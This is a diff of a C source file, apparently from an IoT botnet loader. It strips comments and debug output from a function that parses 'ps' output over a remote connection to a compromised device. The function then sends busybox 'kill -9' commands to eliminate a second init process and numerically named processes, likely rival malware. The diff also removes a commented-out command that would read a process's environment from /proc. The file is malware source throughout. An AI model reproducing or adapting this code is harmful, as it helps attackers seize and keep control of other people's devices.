@@ -1,30 +1,30 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
 
-/* Type definitions */
-typedef  int uint8_t ;
-struct connection {char* rdbuf; int rdbuf_pos; int /*<<< orphan*/  fd; } ;
-typedef  scalar_t__ BOOL ;
 
-/* Variables and functions */
- scalar_t__ FALSE ; 
- char* TOKEN_RESPONSE ; 
- scalar_t__ TRUE ; 
- int atoi (char*) ; 
- int /*<<< orphan*/  memmove (char*,char*,int) ; 
- int /*<<< orphan*/  printf (char*,int,char*) ; 
- scalar_t__ strcmp (char*,char*) ; 
- int strlen (char*) ; 
- int util_memsearch (char*,int,char*,int) ; 
- int /*<<< orphan*/  util_sockprintf (int /*<<< orphan*/ ,char*,int) ; 
+
+
+
+typedef int uint8_t ;
+struct connection {char* rdbuf; int rdbuf_pos; int fd; } ;
+typedef scalar_t__ BOOL ;
+
+
+ scalar_t__ FALSE ;
+ char* TOKEN_RESPONSE ;
+ scalar_t__ TRUE ;
+ int atoi (char*) ;
+ int memmove (char*,char*,int) ;
+ int printf (char*,int,char*) ;
+ scalar_t__ strcmp (char*,char*) ;
+ int strlen (char*) ;
+ int util_memsearch (char*,int,char*,int) ;
+ int util_sockprintf (int ,char*,int) ;
 
 int connection_consume_psoutput(struct connection *conn)
 {
@@ -42,7 +42,7 @@ int connection_consume_psoutput(struct connection *conn)
         {
             uint8_t option_on = 0;
             BOOL last_character_was_space = FALSE;
-            char *pid_str = NULL, *proc_name = NULL;
+            char *pid_str = ((void*)0), *proc_name = ((void*)0);
 
             conn->rdbuf[i] = 0;
             for (ii = 0; ii < ((char *)&conn->rdbuf[i] - start); ii++)
@@ -69,16 +69,16 @@ int connection_consume_psoutput(struct connection *conn)
                 }
             }
 
-            if (pid_str != NULL && proc_name != NULL)
+            if (pid_str != ((void*)0) && proc_name != ((void*)0))
             {
                 int pid = atoi(pid_str);
                 int len_proc_name = strlen(proc_name);
 
-#ifdef DEBUG
-                printf("pid: %d, proc_name: %s\n", pid, proc_name);
-#endif
 
-                if (pid != 1 && (strcmp(proc_name, "init") == 0 || strcmp(proc_name, "[init]") == 0)) // Kill the second init
+
+
+
+                if (pid != 1 && (strcmp(proc_name, "init") == 0 || strcmp(proc_name, "[init]") == 0))
                     util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                 else if (pid > 400)
                 {
@@ -98,10 +98,10 @@ int connection_consume_psoutput(struct connection *conn)
 
                     if (num_alphas == 0 && num_count > 0)
                     {
-                        //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
-#ifdef DEBUG
-                        printf("Killing suspicious process (pid=%d, name=%s)\n", pid, proc_name);
-#endif
+
+
+
+
                         util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                     }
                 }
